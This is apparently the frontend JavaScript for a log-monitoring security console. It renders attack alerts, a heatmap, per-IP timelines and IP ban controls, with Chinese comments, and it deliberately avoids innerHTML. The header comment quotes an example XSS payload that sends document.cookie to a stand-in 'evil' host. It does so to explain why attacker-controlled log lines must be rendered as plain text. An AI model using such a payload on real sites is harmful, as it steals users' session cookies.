/* 控制台前端逻辑。
 *
 * 这个文件的第一原则：**绝不用 innerHTML。**
 *
 * 原因不是"通常意义上的 XSS 风险"，而是一个更直接的事实：
 * 这个页面显示的所有内容，来源都是攻击者写的请求。
 *
 * 举例：有人访问 /?q=<img src=x onerror=fetch("//evil/"+document.cookie)>
 * 这一行会原样进 nginx 日志，然后通过 API 送到这个页面。
 * 如果这里用 innerHTML 渲染，攻击者的标签会被浏览器解析并执行 ——
 * XSS 的受害者不是网站用户，而是**正在看这条告警的安全分析师**。
 *
 * 所以：所有用户数据一律走 textContent / createTextNode，
 * 浏览器会把它们当纯文本，不解析任何标签。
 * 这是唯一能保证安全的方式，正则清洗 HTML 永远有绕过。
 */

(function () {
  "use strict";

  const cfg = document.getElementById("app-config");
  const CSRF = cfg.dataset.csrf;
  const DRY_RUN = cfg.dataset.dryRun === "1";

  const rowsEl = document.getElementById("rows");
  const emptyEl = document.getElementById("empty");
  const sevEl = document.getElementById("sev-filter");
  const banRowsEl = document.getElementById("ban-rows");
  const banEmptyEl = document.getElementById("ban-empty");

  const SEV_ORDER = { low: 0, medium: 1, high: 2, critical: 3 };
  const SEV_TEXT = { low: "低", medium: "中", high: "高", critical: "严重" };

  let maxSeq = 0;
  let seenUid = new Set();

  /* 建一个单元格。text 一律 string 化后交给 textContent。 */
  function cell(text, className) {
    const td = document.createElement("td");
    if (className) td.className = className;
    td.textContent = text == null ? "" : String(text);
    return td;
  }

  function badge(sev) {
    const span = document.createElement("span");
    span.className = "sev sev-" + sev;
    span.textContent = SEV_TEXT[sev] || sev;
    return span;
  }

  function passesFilter(sev) {
    const floor = sevEl.value;
    if (!floor) return true;
    return (SEV_ORDER[sev] || 0) >= (SEV_ORDER[floor] || 0);
  }

  function addRow(item, prepend) {
    if (seenUid.has(item.uid + "|" + item.time + "|" + item.path)) return;
    seenUid.add(item.uid + "|" + item.time + "|" + item.path);
    if (!passesFilter(item.severity)) return;

    const tr = document.createElement("tr");
    tr.dataset.uid = item.uid;

    tr.appendChild(cell(item.time, "mono"));
    const tdSev = document.createElement("td");
    tdSev.appendChild(badge(item.severity));
    tr.appendChild(tdSev);

    // IP 做成可点击：点开后看这个来源的完整时间线。
    // 用 span + click 而不是 <a href>，是因为不需要跳转、也不该出现在历史记录里。
    const tdIp = cell("", "mono");
    const ipEl = document.createElement("span");
    ipEl.className = "ip-link";
    ipEl.textContent = item.ip;
    ipEl.title = "点击查看该来源的完整时间线";
    ipEl.addEventListener("click", () => showIpDetail(item.ip));
    tdIp.appendChild(ipEl);
    tr.appendChild(tdIp);

    tr.appendChild(cell(item.category));

    // 判定依据可能很长，用 title 属性放全文（属性值不会被解析成标签）
    const tdReason = cell(item.reason, "reason");
    tdReason.title = item.reason + "\n\n原始日志：\n" + item.raw;
    tr.appendChild(tdReason);

    const tdAct = document.createElement("td");
    const btn = document.createElement("button");
    btn.className = "btn-danger";
    btn.type = "button";
    btn.textContent = "封禁";
    btn.addEventListener("click", () => banIp(item.ip, item.uid, item.category));
    tdAct.appendChild(btn);
    tr.appendChild(tdAct);

    if (prepend) rowsEl.prepend(tr);
    else rowsEl.appendChild(tr);

    // 行数上限：长时间开着页面，DOM 无限增长会越来越卡
    while (rowsEl.children.length > 300) {
      rowsEl.removeChild(rowsEl.lastChild);
    }
    emptyEl.style.display = "none";
  }

  /* ---------------------------------------------------------- 热力图 */
  const HEAT_ORDER = ["critical", "high", "medium", "low"];
  const HEAT_NAME = { critical: "严重", high: "高危", medium: "中危", low: "低危" };

  async function refreshHeatmap() {
    try {
      const r = await fetch("/api/heatmap", { credentials: "same-origin" });
      if (r.status === 401) { window.location.href = "/login"; return; }
      if (!r.ok) return;
      const d = await r.json();
      renderHeatmap(d);
    } catch (e) { /* 热力图失败不影响主流程 */ }
  }

  function renderHeatmap(d) {
    const rowsEl = document.getElementById("heat-rows");
    const axisEl = document.getElementById("heat-axis");
    if (!rowsEl) return;

    // 颜色深浅用 CSS 类（h0~h4）而不是内联 style ——
    // CSP 的 style-src 'self' 会拦掉 style 属性，用类名最稳，
    // 也不用为了一个热力图开 'unsafe-inline'。
    const max = d.max || 1;

    rowsEl.replaceChildren();
    for (const sev of HEAT_ORDER) {
      const row = document.createElement("div");
      row.className = "heat-row";

      const label = document.createElement("span");
      label.className = "heat-label";
      label.textContent = HEAT_NAME[sev];
      row.appendChild(label);

      const cells = document.createElement("div");
      cells.className = "heat-cells";
      (d.matrix[sev] || []).forEach((n, i) => {
        const c = document.createElement("span");
        const lvl = n === 0 ? 0 : Math.min(4, Math.ceil((n / max) * 4));
        c.className = "heat-cell h" + lvl + " s-" + sev;
        c.title = `${HEAT_NAME[sev]} · ${n} 条`;
        cells.appendChild(c);
      });
      row.appendChild(cells);
      rowsEl.appendChild(row);
    }

    axisEl.replaceChildren();
    (d.labels || []).forEach((h, i) => {
      const t = document.createElement("span");
      t.className = "heat-tick";
      // 每 3 小时标一次，全标会挤成一团看不清
      t.textContent = i % 3 === 0 ? String(h).padStart(2, "0") : "";
      axisEl.appendChild(t);
    });

    const total = (d.totals || []).reduce((a, b) => a + b, 0);
    const note = document.getElementById("heat-note");
    if (note) {
      note.textContent = total
        ? `最近 24 小时共 ${total} 条 · 峰值 ${max} 条/小时`
        : "最近 24 小时暂无告警";
    }
  }

  /* ---------------------------------------------------------- 来源时间线 */
  async function showIpDetail(ip) {
    const r = await fetch("/api/ip/" + encodeURIComponent(ip), {
      credentials: "same-origin",
    });
    if (r.status === 401) { window.location.href = "/login"; return; }
    if (!r.ok) return;
    const d = await r.json();

    document.getElementById("ip-title").textContent = d.ip;
    document.getElementById("ip-panel").hidden = false;

    const meta = document.getElementById("ip-meta");
    meta.replaceChildren();
    const add = (k, v) => {
      const s = document.createElement("span");
      s.className = "ip-meta-item";
      s.textContent = k + " " + v;
      meta.appendChild(s);
    };
    add("告警", d.count + " 条");
    add("首次", d.first_seen || "-");
    add("最近", d.last_seen || "-");
    const cats = Object.entries(d.categories || {})
      .map(([k, v]) => k + "×" + v)
      .join("、");
    if (cats) add("类型", cats);

    const rows = document.getElementById("ip-rows");
    rows.replaceChildren();
    for (const it of d.items || []) {
      const tr = document.createElement("tr");
      tr.appendChild(cell(it.time, "mono"));
      const td = document.createElement("td");
      td.appendChild(badge(it.severity));
      tr.appendChild(td);
      tr.appendChild(cell(it.category));
      const tdR = cell(it.reason, "reason");
      tdR.title = it.reason + "\n\n原始日志：\n" + it.raw;
      tr.appendChild(tdR);
      rows.appendChild(tr);
    }
  }

  /* ---------------------------------------------------------- 统计数据 */
  async function refreshStats() {
    try {
      const r = await fetch("/api/stats", { credentials: "same-origin" });
      // 会话失效（闲置 8 小时、服务重启换了 secret_key、或者浏览器里
      // 残留的是另一个实例的 cookie）时必须跳回登录页。
      //
      // 不处理的话会变成：页面看着还在，数字却永远不动，
      // SSE 每 3 秒重连一次、每次都 401，服务端日志被刷屏。
      // 用户不会意识到"我掉线了"，只会觉得"这工具坏了"。
      if (r.status === 401) {
        window.location.href = "/login";
        return;
      }
      if (!r.ok) return;
      const d = await r.json();
      const w = d.watcher || {};
      document.getElementById("s-lines").textContent = w.lines_read ?? 0;
      document.getElementById("s-findings").textContent = w.findings_total ?? 0;
      document.getElementById("s-suppressed").textContent = w.suppressed_total ?? 0;
      document.getElementById("s-buffer").textContent = d.buffer ?? 0;
      document.getElementById("s-bans").textContent = d.bans ?? 0;

      const sec = w.uptime_seconds || 0;
      const h = Math.floor(sec / 3600);
      const m = Math.floor((sec % 3600) / 60);
      document.getElementById("s-uptime").textContent =
        h > 0 ? h + "h " + m + "m" : m + "m";
    } catch (e) {
      /* 统计失败不影响主流程，静默即可；不要在页面上弹错误 */
    }
  }

  /* ---------------------------------------------------------- 封禁列表 */
  async function refreshBans() {
    try {
      const r = await fetch("/api/bans", { credentials: "same-origin" });
      if (!r.ok) return;
      const d = await r.json();
      banRowsEl.replaceChildren();
      if (!d.items.length) {
        banEmptyEl.style.display = "";
        return;
      }
      banEmptyEl.style.display = "none";
      for (const b of d.items) {
        const tr = document.createElement("tr");
        tr.appendChild(cell(b.ip, "mono"));
        tr.appendChild(cell(b.expires, "mono"));
        tr.appendChild(cell(b.reason, "reason"));
        tr.appendChild(cell(b.operator));
        const td = document.createElement("td");
        const btn = document.createElement("button");
        btn.type = "button";
        btn.className = "btn-ghost";
        btn.textContent = "解封";
        btn.addEventListener("click", () => unban(b.ip));
        td.appendChild(btn);
        tr.appendChild(td);
        banRowsEl.appendChild(tr);
      }
      document.getElementById("ban-mode").textContent =
        d.dry_run ? "演练模式：不会真正写入 nginx" : "生效模式";
    } catch (e) { /* ignore */ }
  }

  /* ---------------------------------------------------------- 封禁动作 */
  async function postJSON(url, body) {
    const r = await fetch(url, {
      method: "POST",
      credentials: "same-origin",
      headers: {
        "Content-Type": "application/json",
        // 自定义头 + 服务端校验，构成 CSRF 双保险。
        // 跨站请求无法在预检通过的情况下带上这个自定义头。
        "X-CSRF-Token": CSRF,
      },
      body: JSON.stringify(body),
    });
    return r.json();
  }

  async function banIp(ip, uid, category) {
    const ok = window.confirm(
      "封禁 " + ip + " ？\n\n默认 1 小时后自动解封。" +
      (DRY_RUN ? "\n\n当前是演练模式，不会真正生效。" : "")
    );
    if (!ok) return;
    const d = await postJSON("/api/ban", {
      ip: ip,
      ttl: 3600,
      reason: "控制台手工封禁 · " + category,
      uid: uid,
    });
    if (d.error) {
      window.alert("封禁失败：" + d.error);
      return;
    }
    refreshBans();
    refreshStats();
  }

  async function unban(ip) {
    const d = await postJSON("/api/unban", { ip: ip });
    if (d.error) {
      window.alert("解封失败：" + d.error);
      return;
    }
    refreshBans();
    refreshStats();
  }

  /* ---------------------------------------------------------- SSE */
  function connect() {
    // EventSource 断线会自动重连，但重连后服务端不知道我们收到哪儿了，
    // 所以把 maxSeq 带上，只补发新的，避免重复刷屏。
    const es = new EventSource("/api/stream?since=" + maxSeq);

    es.onmessage = function (ev) {
      let item;
      try {
        item = JSON.parse(ev.data);
      } catch (e) {
        return; // 心跳或其他非 JSON 消息直接忽略
      }
      if (item.seq) maxSeq = Math.max(maxSeq, item.seq);
      addRow(item, true);
    };

    es.onerror = function () {
      es.close();
      // 退避重连，避免服务端重启时一秒建立几十个连接
      setTimeout(connect, 3000);
    };
  }

  /* ---------------------------------------------------------- 初始化 */
  sevEl.addEventListener("change", () => {
    // 筛选变化时重建当前列表：清屏最省事，也不用维护两套渲染逻辑
    rowsEl.replaceChildren();
    seenUid.clear();
    fetch("/api/findings?limit=200", { credentials: "same-origin" })
      .then((r) => r.json())
      .then((d) => (d.items || []).slice().reverse().forEach((x) => addRow(x, false)));
  });

  document.getElementById("btn-clear").addEventListener("click", () => {
    rowsEl.replaceChildren();
    seenUid.clear();
    emptyEl.style.display = "";
  });

  const ipClose = document.getElementById("ip-close");
  if (ipClose) {
    ipClose.addEventListener("click", () => {
      document.getElementById("ip-panel").hidden = true;
    });
  }

  // 先把已有告警铺一遍，再接实时流
  fetch("/api/findings?limit=100", { credentials: "same-origin" })
    .then((r) => r.json())
    .then((d) => (d.items || []).slice().reverse().forEach((x) => addRow(x, false)))
    .catch(() => {});

  connect();
  refreshStats();
  refreshBans();
  refreshHeatmap();
  setInterval(refreshStats, 2000);
  setInterval(refreshBans, 5000);
  // 热力图 10 秒刷一次就够：它的数据粒度是小时，刷太快没有意义，
  // 反而增加请求量（页面已经每 2 秒在轮询统计了）
  setInterval(refreshHeatmap, 10000);
})();
